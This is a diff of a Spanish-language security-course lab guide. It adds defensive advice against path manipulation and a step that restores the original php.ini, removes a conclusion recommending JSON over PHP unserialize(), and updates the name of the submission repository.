+- Sanitización de ruta (eliminar ../ y evitar que el archivo no tenga caracteres maliciosos).
+- Uso de lista blanca de archivos.
+
+### Dejando todo en orden
+----
+
+Recuerda volver a poner el archivo php.ini original:
+
 ~~~
-
-Ahora vemos como nos da error en el caso de que intentemos meter los objetos serializados en vez de mandarlos en forma de JSON.
-
-![](images/UD15.png)
-
-El código no lo detecta como inválido
-
-🚀 **Conclusiones**
-
-Usar JSON en lugar de **serialize()/unserialize()** es una de las mejores formas de evitar la deserialización insegura, ya que **JSON** solo representa datos, no objetos con métodos o comportamientos.
+cd /usr/local/etc/php/
+cp php.ini-original php.ini
+~~~
 
 
 ## ENTREGA
 
 > __Realiza las operaciones indicadas__
 
-> __Crea un repositorio  con nombre PPS-Unidad3Actividad-Tu-Nombre donde documentes la realización de ellos.__
+> __Crea un repositorio  con nombre PPS-Unidad3Actividad9-Tu-Nombre donde documentes la realización de ellos.__
 
 > No te olvides de documentarlo convenientemente con explicaciones, capturas de pantalla, etc.
 
